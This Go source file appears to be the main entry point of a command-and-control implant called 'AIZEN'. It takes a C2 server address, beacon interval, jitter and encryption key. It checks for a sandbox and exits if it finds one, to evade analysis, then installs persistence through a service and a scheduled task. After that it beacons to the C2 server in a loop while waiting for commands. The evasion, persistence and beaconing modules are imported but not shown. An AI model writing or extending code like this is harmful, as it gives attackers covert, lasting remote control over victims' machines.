package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"AIZEN/cmd/modules/beacon"
	"AIZEN/cmd/modules/evade"
	"AIZEN/cmd/modules/persist"
	"AIZEN/internal/crypto"
	"AIZEN/internal/display"
)

var (
	server   = flag.String("server", "127.0.0.1:443", "C2 server address")
	interval = flag.Int("interval", 30, "beacon interval in seconds")
	jitter   = flag.Int("jitter", 10, "max jitter in seconds")
	key      = flag.String("key", "", "encryption key (32 bytes base64)")
	noBanner = flag.Bool("nobanner", false, "hide banner")
)

func main() {
	flag.Parse()

	if !*noBanner {
		fmt.Println(display.GreenBanner)
	}

	if evade.IsSandboxed() {
		log.Println("[*] sandbox detected, sleeping...")
		time.Sleep(5 * time.Minute)
		os.Exit(0)
	}

	var aesKey []byte
	if *key != "" {
		var err error
		aesKey, err = crypto.DecodeKey(*key)
		if err != nil {
			log.Fatal("[-] invalid key:", err)
		}
	}

	persist.Install()
	persist.InstallTask()

	c2 := beacon.New(*server, aesKey)
	c2.SetJitter(*interval, *jitter)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		for {
			c2.Beacon()
			time.Sleep(time.Duration(c2.NextInterval()) * time.Second)
		}
	}()

	log.Println("[+] AIZEN running. waiting for commands.")
	<-sigChan
	log.Println("[*] shutting down...")
}